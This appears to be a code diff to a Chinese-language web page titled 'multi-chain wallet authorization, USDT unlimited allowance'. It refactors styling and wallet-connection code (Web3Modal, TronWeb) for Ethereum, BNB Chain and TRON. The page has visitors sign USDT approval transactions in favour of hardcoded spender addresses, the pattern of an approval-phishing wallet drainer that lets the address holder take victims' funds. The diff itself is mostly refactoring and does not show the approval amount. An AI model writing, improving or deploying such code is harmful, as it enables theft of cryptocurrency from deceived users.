@@ -5,23 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>多链钱包授权 | USDT 无限额度</title>
     <style>
-        /* 样式保持不变，此处省略，实际使用时复制上面完整样式 */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             padding: 20px;
         }
-        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
         .card {
             background: white;
             border-radius: 24px;
             padding: 24px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
         }
-        h1 { font-size: 28px; color: #333; margin-bottom: 8px; }
-        .subtitle { color: #666; font-size: 14px; margin-bottom: 24px; }
+        h1 {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
         .chain-selector {
             display: flex;
             gap: 12px;
@@ -218,19 +233,12 @@
 
     <!-- 引入依赖 -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@web3modal/ethers@2.6.0/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.6.0/dist/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     
     <script>
         // ==================== 配置 ====================
         const PROJECT_ID = '91bd623c7859e77a38c7b10c615976b6';
-        
-        // 链配置
-        const CHAINS = {
-            1: { name: 'Ethereum', chainId: 1, isEvm: true },
-            56: { name: 'BNB Chain', chainId: 56, isEvm: true },
-            728126428: { name: 'TRON', chainId: 728126428, isEvm: false }
-        };
         
         // USDT 合约地址
         const USDT_ADDRESS = {
@@ -239,7 +247,7 @@
             728126428: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
         };
         
-        // 授权地址
+        // 授权地址（分别定义）
         const SPENDER_ADDRESS = {
             1: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',
             56: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',
@@ -287,6 +295,7 @@
             document.getElementById('spenderDisplay').textContent = SPENDER_ADDRESS[chainId];
         }
         
+        // ==================== UI 渲染 ====================
         function renderWalletList() {
             const isTron = currentChain === '728126428';
             const wallets = isTron ? TRON_WALLETS : EVM_WALLETS;
@@ -312,45 +321,37 @@
             });
         }
         
-        // ==================== EVM 授权（Web3Modal） ====================
+        // ==================== EVM 链授权 ====================
         async function initWeb3Modal() {
-            if (web3Modal) return;
-            try {
+            if (!web3Modal && typeof Web3Modal !== 'undefined') {
                 web3Modal = new Web3Modal({
                     projectId: PROJECT_ID,
-                    ethersConfig: {
-                        ethers: window.ethers
-                    },
-                    chains: [1, 56],
+                    walletConnectVersion: 2,
                     themeMode: 'light',
                     themeVariables: {
                         '--w3m-accent-color': '#667eea'
                     },
+                    chains: [1, 56],
                     enableExplorer: true,
                     explorerRecommendedWalletIds: [
-                        'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
-                        'c03dfee351b6fcc421b4494ea33b9d4b92f07f86e0c4d150b2cb8dc02b5713bd',
-                        'c3a90c12093152f71ddc2669f65f130aa3c760391b940fcb4346f07ac5e74a3d',
-                        '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
+                        'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
+                        'c03dfee351b6fcc421b4494ea33b9d4b92f07f86e0c4d150b2cb8dc02b5713bd', // TokenPocket
+                        'c3a90c12093152f71ddc2669f65f130aa3c760391b940fcb4346f07ac5e74a3d', // imToken
+                        '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
                     ]
                 });
-            } catch (error) {
-                console.error('Web3Modal 初始化失败:', error);
-                showStatus('初始化失败，请刷新重试', 'error');
             }
         }
         
         async function approveEvm() {
-            await initWeb3Modal();
-            if (!web3Modal) {
-                showStatus('Web3Modal 未初始化', 'error');
-                return;
-            }
             try {
-                // 打开模态框，获取 provider
-                const { provider, address } = await web3Modal.connect();
+                await initWeb3Modal();
+                if (!web3Modal) throw new Error('Web3Modal 未初始化');
+                
+                const provider = await web3Modal.connect();
                 const ethersProvider = new ethers.providers.Web3Provider(provider);
                 const signer = ethersProvider.getSigner();
+                const address = await signer.getAddress();
                 updateInfoText(`已连接: ${address.slice(0, 6)}...${address.slice(-4)}`);
                 
                 const chainId = parseInt(currentChain);
@@ -370,7 +371,7 @@
                 updateInfoText(`授权成功！交易ID: ${receipt.transactionHash.slice(0, 10)}...`);
             } catch (error) {
                 console.error('EVM 授权失败:', error);
-                if (error.message.includes('reject') || error.message.includes('deny')) {
+                if (error.message?.includes('reject') || error.message?.includes('deny')) {
                     showStatus('用户取消了授权', 'error');
                 } else {
                     showStatus('授权失败: ' + error.message, 'error');
@@ -378,7 +379,7 @@
             }
         }
         
-        // ==================== TRON 授权 ====================
+        // ==================== TRON 链授权 ====================
         function isInTronWalletBrowser() {
             return (typeof window.tronLink !== 'undefined' && window.tronLink.ready) ||
                    (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress);
@@ -430,12 +431,13 @@
             }
         }
         
-        // ==================== 主入口 ====================
+        // ==================== 主授权入口 ====================
         async function onApprove() {
             if (!selectedWallet) {
                 showStatus('请先选择钱包', 'error');
                 return;
             }
+            
             const isTron = currentChain === '728126428';
             if (isTron) {
                 await approveTron();
@@ -444,6 +446,7 @@
             }
         }
         
+        // ==================== 链切换 ====================
         function onChainChange(chainId) {
             currentChain = chainId;
             selectedWallet = null;
@@ -467,6 +470,7 @@
             }
         }
         
+        // ==================== 初始化 ====================
         function init() {
             document.querySelectorAll('.chain-btn').forEach(btn => {
                 btn.addEventListener('click', () => {
